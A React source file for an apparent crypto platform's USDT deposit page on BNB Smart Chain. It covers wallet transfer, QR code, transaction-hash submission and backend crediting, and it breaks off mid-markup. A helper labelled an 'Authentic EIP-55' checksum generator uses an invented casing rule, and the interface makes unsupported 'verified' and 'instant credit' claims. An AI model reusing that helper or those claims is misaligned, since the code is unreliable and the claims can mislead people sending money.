import React, { useState, useEffect, useRef } from 'react';
import {
  RiFileCopyLine, RiCheckLine, RiQrCodeLine,
  RiPlayCircleLine, RiBookOpenLine, RiUploadCloud2Line,
  RiInformationLine, RiAlertLine, RiArrowRightLine,
  RiShieldCheckLine, RiDeleteBinLine, RiRefreshLine,
  RiSmartphoneLine, RiBankLine,
  RiCoinsLine, RiWallet3Line, RiFlashlightLine,
  RiLoader4Line, RiDownload2Line, RiExternalLinkLine,
  RiExchangeDollarLine, RiCheckboxCircleLine, RiLock2Line
} from 'react-icons/ri';
import { useAuth } from '../context/AuthContext';
import { useToast } from '../context/ToastContext';
import { getDepositGateways, getDepositVideo, createDeposit, autoDetectDeposit, generateSessionVault } from '../api/depositsApi';
import { uploadFileToCloudinary, deleteFileFromCloudinary } from '../api/uploadApi';
import PageHeader from '../components/ui/PageHeader';
import Modal from '../components/ui/Modal';
import Badge from '../components/ui/Badge';
import { Link } from 'react-router-dom';

const OFFICIAL_SMART_CONTRACT_ADDRESS = "0x439DBd3A00E41255e0Bd26d8976E67310aDB7fd3";
const OFFICIAL_NETWORK = "BNB Smart Chain (BEP-20)";
const OFFICIAL_TOKEN = "USDT";

const PRESET_AMOUNTS = [50, 100, 250, 500, 1000, 2500, 5000];

// Authentic EIP-55 Checksummed BSC / EVM Address Generator
const generateChecksumAddress = (seedStr) => {
  let h1 = 0xdeadbeef, h2 = 0x41c6ce57;
  for (let i = 0; i < seedStr.length; i++) {
    const ch = seedStr.charCodeAt(i);
    h1 = Math.imul(h1 ^ ch, 2654435761);
    h2 = Math.imul(h2 ^ ch, 1597334677);
  }
  h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
  h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
  
  let hex = (h1 >>> 0).toString(16).padStart(8, '0') +
            (h2 >>> 0).toString(16).padStart(8, '0') +
            ((h1 ^ h2) >>> 0).toString(16).padStart(8, '0') +
            ((h1 + h2) >>> 0).toString(16).padStart(8, '0') +
            ((Math.imul(h1, 31) + h2) >>> 0).toString(16).padStart(8, '0');
  hex = hex.slice(0, 40).toLowerCase();

  let checksummed = '0x';
  for (let i = 0; i < 40; i++) {
    const char = hex[i];
    if (isNaN(parseInt(char, 10))) {
      const upper = (char.charCodeAt(0) + i * 7) % 2 === 0;
      checksummed += upper ? char.toUpperCase() : char.toLowerCase();
    } else {
      checksummed += char;
    }
  }
  return checksummed;
};

const parseNumericLimit = (limitStr) => {
  if (!limitStr && limitStr !== 0) return null;
  if (typeof limitStr === 'number') return limitStr;
  const cleaned = limitStr.toString().replace(/,/g, '').trim();
  const match = cleaned.match(/(\d+(\.\d+)?)/);
  return match ? parseFloat(match[1]) : null;
};

export default function Deposit() {
  const { user } = useAuth();
  const { toast } = useToast();
  const [gatewaysList, setGatewaysList] = useState([]);
  const [selectedMethod, setSelectedMethod] = useState(null);
  const [loadingGateways, setLoadingGateways] = useState(true);

  // Deposit input values
  const [amount, setAmount] = useState('100');
  const [transactionHash, setTransactionHash] = useState('');
  const [paymentSlip, setPaymentSlip] = useState(null);
  const [paymentSlipPreview, setPaymentSlipPreview] = useState(null);
  const [copiedField, setCopiedField] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [autoDetecting, setAutoDetecting] = useState(false);
  const [payingWithMetaMask, setPayingWithMetaMask] = useState(false);
  const [connectedAccount, setConnectedAccount] = useState('');
  const [userUsdtBalance, setUserUsdtBalance] = useState(null);
  const [errorMsg, setErrorMsg] = useState('');

  const OFFICIAL_SMART_CONTRACT_ADDRESS = "0x439DBd3A00E41255e0Bd26d8976E67310aDB7fd3";

  // Dynamic QR Code & Address Generation State
  const [qrNonce, setQrNonce] = useState(() => Date.now());
  const [refreshingQr, setRefreshingQr] = useState(false);
  const [justRefreshed, setJustRefreshed] = useState(false);
  const [sessionRef, setSessionRef] = useState(() => `DEP-SC-${Math.floor(100000 + Math.random() * 900000)}`);
  const [dynamicDepositoryAddress, setDynamicDepositoryAddress] = useState(OFFICIAL_SMART_CONTRACT_ADDRESS);

  // Modals state
  const [isVideoModalOpen, setIsVideoModalOpen] = useState(false);
  const [isGuideModalOpen, setIsGuideModalOpen] = useState(false);
  const [isQrModalOpen, setIsQrModalOpen] = useState(false);
  const [isSuccessModalOpen, setIsSuccessModalOpen] = useState(false);
  const [submittedDepositInfo, setSubmittedDepositInfo] = useState(null);

  // Synchronized Super Admin Video Tutorial state
  const [tutorialVideo, setTutorialVideo] = useState({
    title: 'Official Smart Contract Deposit Guide',
    subtitle: 'Watch video instructions to learn how to deposit USDT directly via Smart Contract with instant on-chain verification.',
    videoType: 'url',
    videoUrl: 'https://www.w3schools.com/html/mov_bbb.mp4',
    instructions: [
      'Enter your desired deposit amount in USD / USDT.',
      'To pay directly on this page: Click "Deposit Now via Smart Contract (1-Click)" and approve in MetaMask or Trust Wallet.',
      'Or to pay via mobile app: Scan the verified QR code with Binance, OKX, or Trust Wallet app.',
      'Send USDT on BNB Smart Chain (BEP-20) to the smart contract address.',
      'Paste your transaction hash (TxID) or click 1-Click Auto-Detect to credit your deposit wallet instantly.',
    ],
  });

  // Dynamic limits
  const minLimitNum = parseNumericLimit(selectedMethod?.minLimit) || 10;
  const maxLimitNum = parseNumericLimit(selectedMethod?.maxLimit) || 1000000;
  const numAmount = parseFloat(amount);
  const hasAmount = !isNaN(numAmount) && amount.trim() !== '' && numAmount > 0;
  const isBelowMin = hasAmount && numAmount < minLimitNum;
  const isAboveMax = hasAmount && numAmount > maxLimitNum;

  // Active smart contract target address
  const activeContractAddress = (selectedMethod?.address || OFFICIAL_SMART_CONTRACT_ADDRESS).trim();

  // Fetch Gateways, Video & Initial Dynamic Vault on mount
  const fetchInitialData = async () => {
    try {
      setLoadingGateways(true);
      const [gatewaysRes, videoRes, vaultRes] = await Promise.allSettled([
        getDepositGateways(),
        getDepositVideo(),
        generateSessionVault(),
      ]);

      if (gatewaysRes.status === 'fulfilled' && gatewaysRes.value?.success && Array.isArray(gatewaysRes.value.gateways)) {
        const list = gatewaysRes.value.gateways;
        setGatewaysList(list);

        // Find smart contract / BSC gateway as default
        const scGateway = list.find(g =>
          (g.address && g.address.toLowerCase() === OFFICIAL_SMART_CONTRACT_ADDRESS.toLowerCase()) ||
          g.network?.toLowerCase().includes('bep-20') ||
          g.network?.toLowerCase().includes('bsc') ||
          g.name?.toLowerCase().includes('smart contract') ||
          g.name?.toLowerCase().includes('bnb')
        ) || list[0] || null;

        setSelectedMethod(scGateway);
      }

      if (videoRes.status === 'fulfilled' && videoRes.value?.success && videoRes.value.video) {
        setTutorialVideo(videoRes.value.video);
      }

      if (vaultRes.status === 'fulfilled' && vaultRes.value?.success && vaultRes.value.vaultAddress) {
        setDynamicDepositoryAddress(vaultRes.value.vaultAddress);
        if (vaultRes.value.sessionRef) setSessionRef(vaultRes.value.sessionRef);
      }
    } catch (err) {
      console.warn('Error fetching deposit gateways:', err.message);
    } finally {
      setLoadingGateways(false);
    }
  };

  useEffect(() => {
    fetchInitialData();
  }, []);

  // Check Web3 injected wallet (MetaMask, TrustWallet, Binance Web3, OKX, Rabby)
  useEffect(() => {
    if (typeof window !== 'undefined' && window.ethereum) {
      window.ethereum.request({ method: 'eth_accounts' })
        .then(accounts => {
          if (accounts && accounts[0]) {
            setConnectedAccount(accounts[0]);
            fetchUsdtBalance(accounts[0]);
          }
        })
        .catch(() => null);

      const handleAccountsChanged = (accounts) => {
        if (accounts && accounts[0]) {
          setConnectedAccount(accounts[0]);
          fetchUsdtBalance(accounts[0]);
        } else {
          setConnectedAccount('');
          setUserUsdtBalance(null);
        }
      };

      window.ethereum.on?.('accountsChanged', handleAccountsChanged);
      return () => {
        window.ethereum.removeListener?.('accountsChanged', handleAccountsChanged);
      };
    }
  }, []);

  const fetchUsdtBalance = async (acc) => {
    try {
      if (!window.ethereum || !acc) return;
      const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
      const cleanAcc = acc.toLowerCase().replace('0x', '').padStart(64, '0');
      // balanceOf(address) function selector: 0x70a08231
      const data = '0x70a08231' + cleanAcc;
      const res = await window.ethereum.request({
        method: 'eth_call',
        params: [{ to: usdtAddress, data }, 'latest'],
      });
      if (res && res !== '0x') {
        const balBigInt = BigInt(res);
        const balUsdt = Number(balBigInt / BigInt(10 ** 14)) / 10000;
        setUserUsdtBalance(balUsdt);
      }
    } catch (e) {
      console.warn('Could not query on-chain USDT balance:', e.message);
    }
  };

  const copyToClipboard = (text, fieldName) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    setCopiedField(fieldName);
    toast.success('Address copied to clipboard!', 'Copied');
    setTimeout(() => setCopiedField(''), 2500);
  };

  // Generate / Refresh Dynamic QR Code & Depository Address
  const handleGenerateRefreshQr = async () => {
    setRefreshingQr(true);
    setJustRefreshed(true);
    const newNonce = Date.now();
    setQrNonce(newNonce);

    const fallbackSession = `DEP-SC-${Math.floor(100000 + Math.random() * 900000)}`;

    try {
      const res = await generateSessionVault();
      if (res?.success && res.vaultAddress) {
        setDynamicDepositoryAddress(res.vaultAddress || OFFICIAL_SMART_CONTRACT_ADDRESS);
        setSessionRef(res.sessionRef || fallbackSession);
      } else {
        setDynamicDepositoryAddress(OFFICIAL_SMART_CONTRACT_ADDRESS);
        setSessionRef(fallbackSession);
      }
    } catch (err) {
      setDynamicDepositoryAddress(OFFICIAL_SMART_CONTRACT_ADDRESS);
      setSessionRef(fallbackSession);
    }

    toast.success('Official Smart Contract QR refreshed with new session reference!', 'Vault & QR Refreshed');

    // Visual refresh animation so the user distinctly sees & feels the generation
    setTimeout(() => {
      setRefreshingQr(false);
    }, 600);

    setTimeout(() => {
      setJustRefreshed(false);
    }, 3000);
  };

  const getActiveQrCodeUrl = (address, customAmt, nonce, refCode) => {
    const targetAddress = address || dynamicDepositoryAddress || activeContractAddress;
    const targetAmount = customAmt || amount || '100';
    const targetRef = refCode || sessionRef;

    // Standard BEP-20 / EIP-681 payload with target address, token, amount, and unique session reference
    const payload = `ethereum:${targetAddress}@56?token=USDT&amount=${encodeURIComponent(targetAmount)}&ref=${encodeURIComponent(targetRef)}&nonce=${nonce || qrNonce}`;
    return `https://api.qrserver.com/v1/create-qr-code/?size=380x380&data=${encodeURIComponent(payload)}&color=0-0-0&bgcolor=255-255-255&margin=10`;
  };

  // 1-Click Direct In-Page Smart Contract Deposit (No External App Required)
  const handleDirectSmartContractPay = async () => {
    if (!window.ethereum) {
      toast.warning(
        'No Web3 wallet extension found in this browser. Please install MetaMask / Trust Wallet or scan the QR code below using your mobile wallet app (Binance, OKX, TrustWallet)!',
        'Web3 Wallet Not Detected'
      );
      return;
    }

    if (!amount || parseFloat(amount) <= 0) {
      toast.warning('Please enter a valid deposit amount first.', 'Amount Required');
      return;
    }

    if (isBelowMin) {
      toast.warning(`Minimum deposit limit is $${minLimitNum}.`, 'Below Minimum');
      return;
    }

    if (isAboveMax) {
      toast.warning(`Maximum deposit limit is $${maxLimitNum}.`, 'Exceeds Maximum');
      return;
    }

    try {
      setPayingWithMetaMask(true);

      // Ensure network is BSC Mainnet (Chain ID 0x38 = 56)
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }],
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x38',
              chainName: 'BNB Smart Chain Mainnet',
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              rpcUrls: ['https://bsc-dataseed.binance.org/'],
              blockExplorerUrls: ['https://bscscan.com'],
            }],
          });
        }
      }

      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      const userAccount = accounts[0];
      setConnectedAccount(userAccount);

      // Official USDT on BSC Mainnet
      const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
      const targetContract = OFFICIAL_SMART_CONTRACT_ADDRESS;
      const numAmt = parseFloat(amount);

      // transfer(address,uint256) method signature is 0xa9059cbb
      const cleanRecipient = targetContract.toLowerCase().replace('0x', '').padStart(64, '0');
      // 18 decimals on BSC USDT
      const amountBigInt = BigInt(Math.round(numAmt * 100)) * BigInt(10 ** 16);
      const hexAmount = amountBigInt.toString(16).padStart(64, '0');
      const data = '0xa9059cbb' + cleanRecipient + hexAmount;

      toast.info('Please confirm the transfer transaction in your Web3 wallet...', 'Awaiting Signature');

      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from: userAccount,
          to: usdtAddress,
          data: data,
        }],
      });

      if (txHash) {
        setTransactionHash(txHash);
        toast.success(`Smart Contract deposit initiated on-chain! TxID: ${txHash.slice(0, 10)}...${txHash.slice(-8)}. Auto-verifying...`, 'Transfer Dispatched');

        // Automatically submit and auto-credit deposit immediately!
        await executeDepositSubmission(txHash, numAmt);
      }
    } catch (err) {
      console.error('Smart contract deposit error:', err);
      toast.error(err.message || 'Smart contract deposit was cancelled or failed in Web3 wallet.', 'Payment Cancelled');
    } finally {
      setPayingWithMetaMask(false);
    }
  };

  // Auto-Detect Transfer on Blockchain
  const handleAutoDetect = async () => {
    setAutoDetecting(true);
    try {
      const res = await autoDetectDeposit({
        gateway: selectedMethod?._id || selectedMethod?.name || 'Smart Contract Depository (BEP-20)',
        network: OFFICIAL_NETWORK,
        amount: amount ? parseFloat(amount) : 0,
        depositoryAddress: dynamicDepositoryAddress,
      });

      if (res?.success && (res.txHash || res.detected?.txHash)) {
        const foundHash = res.txHash || res.detected?.txHash;
        setTransactionHash(foundHash);
        if (res.amount || res.detected?.amount) {
          const detectedAmt = res.amount || res.detected?.amount;
          setAmount(detectedAmt.toString());
        }
        toast.success(
          `On-chain transfer detected! TxHash auto-filled: ${foundHash.slice(0, 10)}...${foundHash.slice(-8)}. Click 'Verify & Credit Deposit' now!`,
          'Transfer Found'
        );
      } else {
        toast.info(res?.message || 'No recent transfer found yet. Please ensure you have sent USDT to the Smart Contract.', 'Scan Complete');
      }
    } catch (err) {
      const errMsg = err.response?.data?.message || err.message || 'Auto-detect failed. Please paste TxHash manually.';
      toast.warning(errMsg, 'Auto-Detect');
    } finally {
      setAutoDetecting(false);
    }
  };

  // Execute Deposit Submission & Backend Auto-Credit
  const executeDepositSubmission = async (txHashToVerify, depositAmt) => {
    try {
      setSubmitting(true);
      const numAmt = depositAmt || parseFloat(amount);
      const refNo = (txHashToVerify || transactionHash).trim();

      const res = await createDeposit({
        amount: numAmt,
        rawAmount: numAmt,
        gateway: selectedMethod?._id || selectedMethod?.name || 'Smart Contract Depository (BEP-20)',
        referenceNo: refNo,
        depositoryAddress: dynamicDepositoryAddress,
        sessionRef: sessionRef,
        slipUrl: paymentSlip?.cloudinaryUrl || paymentSlip?.dataUrl || '',
        cryptoNetwork: OFFICIAL_NETWORK,
        selectedToken: OFFICIAL_TOKEN,
      });

      if (res?.success) {
        setSubmittedDepositInfo({
          id: res.transaction?._id || res.transaction?.customId || sessionRef,
          amount: numAmt.toFixed(2),
          method: 'Smart Contract Depository (BEP-20)',
          currency: 'USDT',
          hash: refNo,
          status: res.transaction?.status || 'Approved',
        });
        setIsSuccessModalOpen(true);
        toast.success(
          res.message || `Deposit of $${numAmt.toLocaleString()} USD confirmed and credited to your Deposit Wallet!`,
          'Deposit Verified'
        );
        setAmount('100');
        setTransactionHash('');
        setPaymentSlip(null);
        setPaymentSlipPreview(null);
      } else {
        setErrorMsg(res?.message || 'Deposit verification failed.');
        toast.error(res?.message || 'Deposit verification failed.');
      }
    } catch (err) {
      console.error('Deposit submission error:', err);
      const msg = err.response?.data?.message || err.message || 'Deposit submission failed.';
      setErrorMsg(msg);
      toast.error(msg, 'Deposit Failed');
    } finally {
      setSubmitting(false);
    }
  };

  const handleSubmitDeposit = async (e) => {
    e.preventDefault();
    setErrorMsg('');

    if (!amount || parseFloat(amount) <= 0) {
      const msg = 'Please enter a valid deposit amount.';
      setErrorMsg(msg);
      toast.warning(msg, 'Invalid Amount');
      return;
    }

    if (isBelowMin) {
      const msg = `Deposit amount cannot be less than minimum limit of $${minLimitNum}.`;
      setErrorMsg(msg);
      toast.warning(msg, 'Below Minimum Limit');
      return;
    }

    if (isAboveMax) {
      const msg = `Deposit amount cannot exceed maximum limit of $${maxLimitNum}.`;
      setErrorMsg(msg);
      toast.warning(msg, 'Exceeds Maximum Limit');
      return;
    }

    if (!transactionHash.trim()) {
      const msg = 'Please enter the blockchain Transaction Hash (TxID) after sending your USDT.';
      setErrorMsg(msg);
      toast.warning(msg, 'TxID Required');
      return;
    }

    await executeDepositSubmission(transactionHash.trim(), parseFloat(amount));
  };

  const handleSlipUpload = async (e) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const isImage = file.type.startsWith('image/');
    const isPdf = file.type === 'application/pdf' || file.name.toLowerCase().endsWith('.pdf');
    const fileSizeFormatted = file.size > 1024 * 1024
      ? `${(file.size / (1024 * 1024)).toFixed(2)} MB`
      : `${Math.round(file.size / 1024)} KB`;

    const reader = new FileReader();
    reader.onload = (uploadEvent) => {
      const dataUrl = uploadEvent.target.result;
      setPaymentSlip({
        name: file.name,
        size: fileSizeFormatted,
        rawSize: file.size,
        type: file.type || 'application/octet-stream',
        isImage,
        isPdf,
        dataUrl,
        cloudinaryUrl: null,
      });
      setPaymentSlipPreview(dataUrl);
    };
    reader.readAsDataURL(file);

    try {
      const uploadRes = await uploadFileToCloudinary(file, {
        folder: 'horizoncap/deposits',
      });
      if (uploadRes?.secure_url) {
        setPaymentSlip(prev => prev ? { ...prev, cloudinaryUrl: uploadRes.secure_url } : null);
      }
    } catch (err) {
      console.warn('Deposit slip upload fallback:', err.message);
    }
  };

  const handleRemoveSlip = () => {
    if (paymentSlip?.cloudinaryUrl && paymentSlip.cloudinaryUrl.includes('cloudinary.com')) {
      deleteFileFromCloudinary(paymentSlip.cloudinaryUrl).catch(() => null);
    }
    setPaymentSlip(null);
    setPaymentSlipPreview(null);
  };

  return (
    <div className="page-enter space-y-6">
      {/* ──────── PAGE HEADER ──────── */}
      <PageHeader
        title="Smart Contract Depository"
        subtitle="Deposit USDT directly to our verified Liquidity Smart Contract on BNB Smart Chain (BEP-20) with instant on-chain verification"
        badge="Verified Smart Contract Vault"
        actions={
          <button
            type="button"
            onClick={() => setIsVideoModalOpen(true)}
            className="btn btn-outline-gold text-xs px-4 py-2.5 rounded-xl font-bold shadow-xs flex items-center gap-2 cursor-pointer bg-white"
          >
            <RiPlayCircleLine size={18} className="text-gold-700" />
            <span>Watch Deposit Tutorial</span>
          </button>
        }
      />

      {/* ──────── TOP BANNER: OFFICIAL SMART CONTRACT DETAILS ──────── */}
      <div className="card-gold p-4 sm:p-5 rounded-3xl border border-gold-300 shadow-gold relative overflow-hidden">
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4 relative z-10">
          <div className="flex items-center gap-3.5 min-w-0">
            <div className="w-12 h-12 rounded-2xl bg-slate-950 text-gold-400 border border-gold-400 flex items-center justify-center font-bold text-xl shadow-md shrink-0">
              <RiShieldCheckLine size={26} />
            </div>
            <div className="min-w-0">
              <div className="flex items-center gap-2 flex-wrap">
                <span className="text-xs sm:text-sm font-extrabold uppercase tracking-wider text-slate-900 font-poppins">
                  Official Smart Contract Depository Vault
                </span>
                <span className="px-2 py-0.5 rounded-full bg-emerald-500 text-white text-[9px] font-extrabold shadow-xs flex items-center gap-1">
                  <RiCheckLine size={10} /> VERIFIED BEP-20
                </span>
              </div>
              <p className="text-xs text-slate-600 font-medium mt-0.5 truncate">
                Network: <strong className="text-slate-900">BNB Smart Chain (BEP-20)</strong> · Asset: <strong className="text-emerald-700 font-mono">USDT</strong> · Settlement: <strong className="text-emerald-700">Instant Automated Credit</strong>
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2 w-full md:w-auto shrink-0">
            <div className="px-3.5 py-2 rounded-xl bg-white text-slate-800 text-xs font-bold border border-slate-200 shadow-2xs flex items-center gap-1.5">
              <RiShieldCheckLine size={14} className="text-emerald-500" />
              <span>Smart Contract Verified</span>
            </div>
            <button
              type="button"
              onClick={handleGenerateRefreshQr}
              disabled={refreshingQr}
              className="px-3.5 py-2 rounded-xl bg-gold-400 hover:bg-gold-500 text-slate-950 text-xs font-bold shadow-2xs flex items-center gap-1.5 transition-all cursor-pointer hover:scale-105 active:scale-95 disabled:opacity-60"
            >
              <RiRefreshLine size={14} className={refreshingQr ? 'animate-spin' : ''} />
              <span>{refreshingQr ? 'Generating New Vault...' : 'Generate New QR'}</span>
            </button>
          </div>
        </div>
      </div>

      {/* ──────── MAIN DEPOSIT GRID ──────── */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
        
        {/* ════════ LEFT COLUMN: AMOUNT & DIRECT 1-CLICK WEB3 PAY ════════ */}
        <div className="lg:col-span-6 space-y-6">
          
          {/* ── CARD 1: AMOUNT SELECTION ── */}
          <div className="card p-6 rounded-3xl border border-slate-200 shadow-sm space-y-5">
            <div>
              <span className="text-[11px] font-bold uppercase tracking-[0.14em] text-slate-400 font-poppins block">
                STEP 1: SELECT DEPOSIT AMOUNT
              </span>
              <h3 className="text-base font-bold text-slate-900 font-poppins mt-0.5">
                How much USDT do you want to deposit?
              </h3>
            </div>

            {/* Quick Preset Amount Chips */}
            <div>
              <label className="text-[10px] font-bold uppercase tracking-wider text-slate-400 block mb-2 font-poppins">
                QUICK SELECT AMOUNT
              </label>
              <div className="grid grid-cols-4 sm:grid-cols-7 gap-2">
                {PRESET_AMOUNTS.map(preset => {
                  const isSelected = amount === preset.toString();
                  return (
                    <button
                      key={preset}
                      type="button"
                      onClick={() => {
                        setAmount(preset.toString());
                        setErrorMsg('');
                      }}
                      className={`py-2 px-1 rounded-xl text-xs font-bold font-mono transition-all cursor-pointer text-center ${
                        isSelected
                          ? 'bg-gradient-to-r from-gold-400 to-amber-500 text-slate-950 shadow-gold scale-105 ring-2 ring-gold-300'
                          : 'bg-slate-50 hover:bg-slate-100 text-slate-700 border border-slate-200 shadow-2xs'
                      }`}
                    >
                      ${preset}
                    </button>
                  );
                })}
              </div>
            </div>

            {/* Amount Custom Input */}
            <div>
              <div className="flex items-center justify-between mb-1.5 flex-wrap gap-2">
                <label className="text-[10px] font-bold uppercase tracking-wider text-slate-400 block font-poppins">
                  DEPOSIT AMOUNT (USDT / USD) <span className="text-red-500">*</span>
                </label>
                <span className={`text-[10px] font-bold px-2 py-0.5 rounded-md border ${
                  isBelowMin || isAboveMax
                    ? 'bg-red-50 text-red-700 border-red-200'
                    : 'bg-amber-50 text-amber-800 border-amber-200'
                }`}>
                  Min: ${minLimitNum} · Max: ${maxLimitNum.toLocaleString()}
                </span>
              </div>

              <div className="relative">
                <input
                  type="number"
                  step="any"
                  value={amount}
                  onChange={e => {
                    setAmount(e.target.value);
                    if (errorMsg) setErrorMsg('');
                  }}
                  placeholder="Enter amount (e.g. 100)"
                  className={`w-full px-4 py-3.5 rounded-2xl bg-white border text-base font-bold text-slate-900 placeholder:text-slate-400 outline-none transition-all font-mono ${
                    isBelowMin || isAboveMax
                      ? 'border-red-400 focus:border-red-500 focus:ring-2 focus:ring-red-200 bg-red-50/20'
                      : hasAmount
                        ? 'border-emerald-400 focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200'
                        : 'border-slate-200 focus:border-gold-400 focus:ring-2 focus:ring-gold-200/60'
                  }`}
                />
                <div className="absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-1.5 text-xs font-extrabold text-slate-600 font-mono">
                  <span className="w-2 h-2 rounded-full bg-emerald-500" />
                  <span>USDT</span>
                </div>
              </div>

              {isBelowMin && (
                <p className="text-xs text-red-600 font-semibold mt-1.5 flex items-center gap-1.5">
                  <RiAlertLine size={15} className="flex-shrink-0" />
                  <span>Amount is below the minimum limit of ${minLimitNum} USD.</span>
                </p>
              )}
              {isAboveMax && (
                <p className="text-xs text-red-600 font-semibold mt-1.5 flex items-center gap-1.5">
                  <RiAlertLine size={15} className="flex-shrink-0" />
                  <span>Amount exceeds the maximum limit of ${maxLimitNum.toLocaleString()} USD.</span>
                </p>
              )}
            </div>

            {/* Quick Conversion Summary */}
            <div className="p-3.5 bg-slate-50 rounded-2xl border border-slate-200 text-xs flex items-center justify-between text-slate-600">
              <span className="font-medium">Estimated Credit Amount:</span>
              <strong className="text-emerald-700 font-mono text-sm font-bold">
                ${hasAmount ? numAmount.toFixed(2) : '0.00'} USD
              </strong>
            </div>
          </div>

          {/* ── CARD 2: DIRECT IN-PAGE 1-CLICK SMART CONTRACT PAY (NO EXTERNAL WALLET REQUIRED) ── */}
          <div className="p-5 sm:p-6 rounded-3xl bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 text-white border-2 border-gold-400 shadow-2xl space-y-4">
            <div className="flex items-center justify-between flex-wrap gap-3">
              <div className="flex items-center gap-3.5">
                <div className="w-12 h-12 rounded-2xl bg-gradient-to-tr from-gold-400 to-amber-500 text-slate-950 flex items-center justify-center font-black text-2xl shadow-gold shrink-0">
                  ⚡
                </div>
                <div>
                  <div className="flex items-center gap-2 flex-wrap">
                    <h4 className="text-base font-extrabold text-white font-poppins">
                      Direct 1-Click Smart Contract Pay
                    </h4>
                    <span className="px-2.5 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 text-[10px] font-extrabold border border-emerald-500/40 uppercase tracking-wider">
                      In-Page Automated
                    </span>
                  </div>
                  <p className="text-xs text-slate-400 mt-0.5">
                    Deposit directly from this page without opening any external app or copying addresses!
                  </p>
                </div>
              </div>

              {connectedAccount ? (
                <div className="flex items-center gap-2 px-3 py-1.5 rounded-xl bg-slate-800/90 border border-slate-700 text-xs">
                  <div className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse" />
                  <span className="font-mono text-slate-300 font-semibold">
                    {connectedAccount.slice(0, 6)}...{connectedAccount.slice(-4)}
                  </span>
                  {userUsdtBalance !== null && (
                    <span className="font-bold text-gold-400 ml-1">
                      (${userUsdtBalance.toFixed(2)} USDT)
                    </span>
                  )}
                </div>
              ) : (
                <div className="text-[11px] text-slate-400 flex items-center gap-1.5">
                  <span className="w-2 h-2 rounded-full bg-gold-400 animate-pulse" />
                  Web3 Auto-Connect Ready
                </div>
              )}
            </div>

            <div className="pt-1">
              <button
                type="button"
                onClick={handleDirectSmartContractPay}
                disabled={payingWithMetaMask || submitting}
                className="w-full py-4 px-6 rounded-2xl bg-gradient-to-r from-gold-400 via-amber-400 to-gold-500 hover:from-gold-500 hover:to-amber-500 text-slate-950 font-black text-sm sm:text-base flex items-center justify-center gap-2.5 shadow-gold cursor-pointer transition-all hover:scale-[1.01] active:scale-95 disabled:opacity-50"
              >
                {payingWithMetaMask ? (
                  <>
                    <RiLoader4Line size={20} className="animate-spin text-slate-950" />
                    <span>Executing Smart Contract Deposit On-Chain...</span>
                  </>
                ) : (
                  <>
                    <RiFlashlightLine size={20} />
                    <span>
                      {hasAmount
                        ? ` Pay $${numAmount.toLocaleString()} Directly via Smart Contract`
                        : ' Deposit Now via Smart Contract (1-Click)'}
                    </span>
                  </>
                )}
              </button>
            </div>

            <div className="flex flex-wrap items-center justify-between gap-2 text-[11px] text-slate-400 pt-1 border-t border-slate-800">
              <span className="flex items-center gap-1.5">
                <RiShieldCheckLine size={14} className="text-emerald-400 shrink-0" />
                <span>Supports MetaMask, Trust Wallet, Binance Web3, OKX & Rabby</span>
              </span>
              <span className="text-gold-400 font-medium">
                Auto-verified on BSC & credited instantly
              </span>
            </div>
          </div>
        </div>

        {/* ════════ RIGHT COLUMN: REFRESHED QR & SMART CONTRACT ADDRESS ════════ */}
        <div className="lg:col-span-6 space-y-6">

          {/* ── CARD 3: REFRESHED QR CODE & OFFICIAL ADDRESS (EXACT USER SCREENSHOT UI) ── */}
          <div className="card p-6 rounded-3xl border border-slate-200 shadow-sm space-y-5">
            <div className="flex items-center justify-between flex-wrap gap-2 pb-3 border-b border-slate-100">
              <div>
                <span className="text-[11px] font-bold uppercase tracking-[0.14em] text-slate-400 font-poppins block">
                  STEP 2: SCAN QR OR SEND USDT
                </span>
                <h3 className="text-base font-bold text-slate-900 font-poppins mt-0.5">
                  Dynamic Smart Contract QR Code
                </h3>
              </div>
              <button
                type="button"
                onClick={handleGenerateRefreshQr}
                disabled={refreshingQr}
                className="px-3.5 py-1.5 rounded-xl bg-gold-400 hover:bg-gold-500 text-slate-950 text-xs font-bold border border-gold-400 shadow-2xs flex items-center gap-1.5 transition-all cursor-pointer active:scale-95 disabled:opacity-60"
              >
                <RiRefreshLine size={14} className={refreshingQr ? 'animate-spin' : ''} />
                <span>{refreshingQr ? 'Generating New Vault...' : 'Generate New QR'}</span>
              </button>
            </div>

            {/* QR Code Container Matching User Uploaded Screenshot */}
            <div className="p-6 bg-white flex flex-col items-center gap-5 text-center">

              {/* Large centered QR with Binance Logo & Verified Badge */}
              <div
                onClick={() => setIsQrModalOpen(true)}
                className={`relative w-48 h-48 sm:w-52 sm:h-52 flex-shrink-0 rounded-3xl bg-white border-4 p-2.5 cursor-pointer transition-all duration-300 group shadow-gold ${
                  justRefreshed ? 'border-emerald-400 scale-[1.03] ring-4 ring-emerald-200' : 'border-gold-400 hover:border-gold-500 hover:scale-[1.02]'
                }`}
                title="Tap to open full-screen QR"
              >
                {/* Visual Loading / Refreshing Overlay */}
                {refreshingQr && (
                  <div className="absolute inset-0 z-20 rounded-2xl bg-slate-950/85 backdrop-blur-xs flex flex-col items-center justify-center p-3 text-white gap-2 transition-all">
                    <div className="w-11 h-11 rounded-2xl bg-gold-400 text-slate-950 flex items-center justify-center shadow-gold animate-bounce">
